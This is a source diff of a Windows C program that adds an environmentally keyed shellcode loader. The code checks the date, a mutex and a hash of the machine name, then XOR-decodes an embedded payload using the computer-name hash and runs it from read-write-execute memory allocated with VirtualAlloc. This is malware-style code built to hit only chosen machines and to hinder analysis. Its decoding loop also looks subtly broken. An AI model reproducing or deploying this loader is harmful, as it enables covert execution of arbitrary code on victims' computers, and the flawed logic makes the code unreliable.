@@ -29,8 +29,6 @@ int APIENTRY WinMain(_In_ HINSTANCE hInst,
 //////////////////////////////////////////////////////////////////////////////////
 
 void CheckExecution() {
-	HGLOBAL *cn;
-	HGLOBAL *cnhash;
 
 	// Perform the date and time check; if it is outside the permitted
 	// date, return now
@@ -43,7 +41,12 @@ void CheckExecution() {
 	// Perform the Mutex check; if it is already running, quit now
 	if (!MutexCheck(MUTEX_NAME)) return;
 
+
+	DecodeShellcode();
 	MessageBox(NULL, "Runs", NULL, NULL);
+
+	ExecuteShellcode(&shellcode, shellcodelen);
+	
 	return;
 }
 
@@ -65,7 +68,7 @@ unsigned int HashCheck() {
 
 	// Check the hash of the computer name
 	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
-		if (cnhash = GenerateHash(cn, strlen(cn))) {
+		if (cnhash = GenerateHash((char *) cn, strlen(cn))) {
 			if (!memcmp(cnhash, &hashSHA1ComputerName, hashSHA1ComputerNamelen)) {
 				ret = TRUE;
 			}
@@ -75,6 +78,49 @@ unsigned int HashCheck() {
 	}
 
 	return ret;
+}
+
+
+
+//////////////////////////////////////////////////////////////////////////////////
+//
+//   DecodeShellcode
+//   This function xor's the shellcode against a concatenated hash 
+//
+//////////////////////////////////////////////////////////////////////////////////
+
+void DecodeShellcode() {
+	HGLOBAL *cn;
+	HGLOBAL *cnhash;
+	unsigned int ret;
+
+	unsigned int sc = 0; // Shellcode position marker
+	unsigned int hc = 0; // Hash position marker
+
+	// Get the computer name (to be used as a decryption key)
+	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
+		if (cnhash = GenerateHash(cn, strlen(cn))) {
+			
+			// Loop through the shellcode
+			for (sc = 0; sc < shellcodelen; sc++) {
+				
+				for (hc = 0; hc < HASH_LEN; hc++) {
+					shellcode[sc] ^= (unsigned char) cnhash[hc];
+				}
+
+				// Loop through the hash
+				if (hc == HASH_LEN - 1) {
+					hc = 0;
+				} else {
+					hc++;
+				}
+			}
+			free(cnhash);
+		}
+		free(cn);
+	}
+
+	return;
 }
 
 
@@ -215,15 +261,14 @@ HGLOBAL GenerateHash(BYTE *src, unsigned int len) {
 
 
 
-void ExecuteShellcode() {
+void ExecuteShellcode(BYTE *buf, unsigned int size) {
 
-	//char *buffer;
-	//void(*shellcodefunction)();
-	//unsigned int size = sizeof(buf);
+	char *buffer;
+	void(*sc)();
 
-	// No mutex exists, so run the code
-	//buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	//memcpy(buffer, buf, size);
-	//shellcodefunction = (void(*)()) buffer;
-	//shellcodefunction();
+	buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(buffer, buf, size);
+	sc = (void(*)()) buffer;
+	sc();
+
 }
